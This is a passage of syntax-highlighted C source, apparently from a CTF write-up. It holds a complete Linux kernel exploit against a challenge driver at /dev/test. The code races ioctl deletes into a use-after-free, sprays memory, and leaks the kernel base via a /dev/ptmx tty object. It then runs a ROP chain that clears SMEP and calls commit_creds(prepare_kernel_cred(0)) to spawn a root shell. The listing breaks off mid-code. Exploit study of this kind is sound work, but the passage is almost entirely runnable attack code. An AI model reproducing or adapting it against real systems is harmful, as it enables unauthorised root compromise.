class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> threadnum 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> spray_times 1024</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mmap_size 1024*64</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_chunk</span>* <span class="title">user_ptr</span>;</span></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">char</span>* mmap_arry[spray_times];</span><br><span class="line"><span class="keyword">int</span> ptmx;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> show_key;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">size_t</span> size,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    user_ptr-&gt;size = size;</span><br><span class="line">    user_ptr-&gt;buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0x23334</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        show_key = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">size_t</span> size,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    user_ptr-&gt;size = size;</span><br><span class="line">    user_ptr-&gt;buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0x23333</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]new error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0x23335</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]delete error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">race_delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">delete</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span>* check()&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; spray_times;i++)&#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> *p = mmap_arry[i];</span><br><span class="line">		<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (j &lt; mmap_size/<span class="number">8</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (p[j] != <span class="number">0x6161616161616161</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"[:)]find it!!!"</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[:)]object = %p\n"</span>,p[j]);</span><br><span class="line">				<span class="keyword">return</span> &amp;p[j];</span><br><span class="line">            &#125;</span><br><span class="line">			j += <span class="number">0x200</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]Root now!!!"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">"/flag"</span>,O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:(]open flag error..."</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">        memset(buf,'\x00',0x100);</span><br><span class="line">        read(fd,buf,<span class="number">0x100</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[:)]flag is here: %s\n"</span>,buf);</span><br><span class="line">        <span class="keyword">char</span>* args[<span class="number">2</span>] = &#123;<span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">        execv(<span class="string">"/bin/sh"</span>, args);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Not root..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rsp,user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">        <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">        <span class="string">"mov user_rsp,rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Save success!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_ptmx_slave</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *pts_name;</span><br><span class="line">	<span class="keyword">if</span> (grantpt(ptmx) &lt; <span class="number">0</span> || unlockpt(ptmx) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]grantpt and unlockpt fail\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">	pts_name = (<span class="keyword">const</span> <span class="keyword">char</span> *)ptsname(ptmx);</span><br><span class="line">	<span class="keyword">int</span> fds = open(pts_name, O_RDONLY | O_NOCTTY);</span><br><span class="line">	<span class="keyword">if</span> (fds &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]open /dev/ptmx fail\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> fds;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save();</span><br><span class="line">    signal(SIGSEGV,get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pthread_t</span> pt[threadnum];    </span><br><span class="line">    <span class="keyword">int</span> t[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span>* user_buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">size_t</span> slub = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span>* user_mmap;</span><br><span class="line">    <span class="keyword">size_t</span> kernel_offset = <span class="number">0x106b4e0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t[i] = open(<span class="string">"/dev/ptmx"</span>,O_RDWR);</span><br><span class="line">		<span class="keyword">if</span> (t[i] == <span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:(]open ptmx error"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)</span><br><span class="line">		close(t[i]);</span><br><span class="line"><span class="comment">//-------------------------------------------------------------------</span></span><br><span class="line">    fd = open(<span class="string">"/dev/test"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]open error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    user_ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    memset(user_buf,'\x11',0x1000);</span><br><span class="line">start1:</span><br><span class="line">    <span class="keyword">new</span>(<span class="number">0x2c0</span>,user_buf);</span><br><span class="line">start2:</span><br><span class="line">    user_mmap = mmap(<span class="literal">NULL</span>,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(user_mmap &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]mmap error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; threadnum;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pthread_create(&amp;pt[i],<span class="literal">NULL</span>,race_delete,<span class="literal">NULL</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:(]pthread_create error..."</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    show(<span class="number">7</span>,user_mmap);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; threadnum;i++)&#123;</span><br><span class="line">        pthread_join(pt[i],<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(show_key == <span class="number">1</span>)&#123;</span><br><span class="line">        show_key = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> start1;</span><br><span class="line">    &#125;</span><br><span class="line">    slub = *(<span class="keyword">size_t</span>*)user_mmap;</span><br><span class="line">    <span class="keyword">if</span>(slub &lt; <span class="number">0xff000000000000</span>)&#123;</span><br><span class="line">        <span class="keyword">goto</span> start2;</span><br><span class="line">    &#125;</span><br><span class="line">    slub = slub | <span class="number">0xff00000000000000</span>;</span><br><span class="line">    slub = slub &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]race success!!!\n[:)]slub = %p\n"</span>,slub);</span><br><span class="line"><span class="comment">//------------------------------------------------------------------------------</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; spray_times;i++)&#123;</span><br><span class="line">        mmap_arry[i] = mmap(<span class="literal">NULL</span>,mmap_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(mmap_arry[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:(]mmap error..."</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(mmap_arry[i],<span class="string">'a'</span>,mmap_size);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//------------------------------------------------------------------------------</span></span><br><span class="line">    <span class="comment">//         0x4000000</span></span><br><span class="line">    <span class="comment">//0xffff888000200000-0xffff888000400000</span></span><br><span class="line">    <span class="comment">//0xffff888000e09000-0xffff888001000000</span></span><br><span class="line">    <span class="comment">//0xffff888001e09000-0xffff888001e0b000</span></span><br><span class="line">    <span class="comment">//0xffff888001e10000-0xffff888002000000 </span></span><br><span class="line">    <span class="comment">//0xffff888002950000-0xffff888002a90000</span></span><br><span class="line">    <span class="comment">//0xffff888002c0d000-0xffff888002c0e000</span></span><br><span class="line">    <span class="comment">//0xffff888002c10000-0xffff888004c00000</span></span><br><span class="line">    <span class="comment">//0xffff888005e15000-0xffff888005eef000</span></span><br><span class="line">    <span class="comment">//0xffff888006800000-0xffff888006a00000</span></span><br><span class="line">    <span class="comment">//0xffff888006a2e000-0xffff888007800000</span></span><br><span class="line">    <span class="comment">//0xffff888007c00000-0xffff888007fe0000  0xffff888007b90000</span></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">int</span> tmp_fd = open(<span class="string">"./data"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(tmp_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]data_file open error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="keyword">size_t</span>*)buf = slub;</span><br><span class="line">    <span class="keyword">if</span>(write(tmp_fd,buf,<span class="number">0x1000</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]data write error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line"><span class="comment">//------------------------------------------------------------------------------</span></span><br><span class="line">    <span class="keyword">size_t</span>* ret_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span>* tmp_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">1000</span>;i++)&#123;</span><br><span class="line">        tmp_addr = mmap(<span class="literal">NULL</span>,<span class="number">0x1000</span>,PROT_READ,MAP_PRIVATE,tmp_fd,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (tmp_addr == MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:(]data mmap fail..."</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; threadnum; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pthread_create(&amp;pt[j],<span class="literal">NULL</span>,race_delete,<span class="literal">NULL</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"[:(]pthread error..."</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">new</span>(<span class="number">0x2c0</span>,tmp_addr);	</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; threadnum; j++)</span><br><span class="line">            pthread_join(pt[j],<span class="literal">NULL</span>);</span><br><span class="line">        ptmx = open(<span class="string">"/dev/ptmx"</span>,O_RDWR);</span><br><span class="line">        ret_addr = check();</span><br><span class="line">        <span class="keyword">if</span>(ret_addr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(ptmx);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ret_addr == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]bad luck..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(tmp_fd);</span><br><span class="line">	kernel_base = ret_addr[<span class="number">3</span>] - kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]ret_addr = %p\n"</span>,ret_addr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[:)]kernel_base = %p\n"</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    commit_creds = kernel_base + <span class="number">0x82d30</span>;</span><br><span class="line">    prepare_kernel_cred = kernel_base + <span class="number">0x83000</span>;</span><br><span class="line">    <span class="keyword">size_t</span> key = kernel_base + <span class="number">0xC010BC</span>;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdi = kernel_base + <span class="number">0x139b</span>;</span><br><span class="line">    <span class="keyword">size_t</span> mov_cr4 = kernel_base + <span class="number">0x4f582</span>;</span><br><span class="line">    <span class="keyword">size_t</span> leave = kernel_base + <span class="number">0x1c4570</span>;</span><br><span class="line">    <span class="keyword">size_t</span> set_memory_x = kernel_base + <span class="number">0x55580</span>;</span><br><span class="line">    <span class="comment">//0xffffffff8104f582: mov cr4, rdi; push rdx; popfq; ret; </span></span><br><span class="line">    <span class="comment">//0xffffffff8100139b: pop rdi; ret;</span></span><br><span class="line">    <span class="comment">//0xffffffff811c4570: leave; ret;</span></span><br><span class="line">    <span class="comment">//0xffffffff819fe4e2: mov rdi, rax; mov qword ptr [rdi], 1; ret;</span></span><br><span class="line">    <span class="comment">//0xffffffff81a09016: swapgs; ret;  </span></span><br><span class="line">    <span class="comment">//0xffffffff81021f52: iretq; ret; </span></span><br><span class="line">    <span class="keyword">int</span> pts = get_ptmx_slave();</span><br><span class="line"></span><br><span class="line">    ret_addr[<span class="number">3</span>] = slub + <span class="number">0x300</span>;</span><br><span class="line">    ret_addr[<span class="number">0x300</span>/<span class="number">8</span>+<span class="number">12</span>] = set_memory_x;</span><br><span class="line"></span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">0</span>] = pop_rdi;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">1</span>] = <span class="number">0x6f0</span>;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">2</span>] = mov_cr4;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">3</span>] = pop_rdi;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">4</span>] = <span class="number">0</span>; </span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">5</span>] = (<span class="keyword">size_t</span>)prepare_kernel_cred;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">6</span>] = kernel_base + <span class="number">0x9fe4e2</span>;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">7</span>] = (<span class="keyword">size_t</span>)commit_creds;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">8</span>] = kernel_base + <span class="number">0xa09016</span>;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">9</span>] = kernel_base + <span class="number">0x21f52</span>;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">10</span>] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">11</span>] = user_cs;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">12</span>] = user_rflags;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">13</span>] = user_rsp;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">14</span>] = user_ss;</span><br><span class="line">    ioctl(pts,<span class="number">0x2333</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    char *shellcode = "H\x81\xc7\x00\x05\x00\x00"  //add rdi,0x500;</span></span><br><span class="line"><span class="comment">                      "W"                          //push rdi;</span></span><br><span class="line"><span class="comment">                      "\x5c"                       //pop rsp;</span></span><br><span class="line"><span class="comment">                      "\xc3";                      //ret;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">char</span>* shellcode = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    memset(shellcode,'\x90',0x100);</span><br><span class="line">    <span class="keyword">char</span>* tmp = shellcode;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0x9090</span>;</span><br><span class="line">    tmp += <span 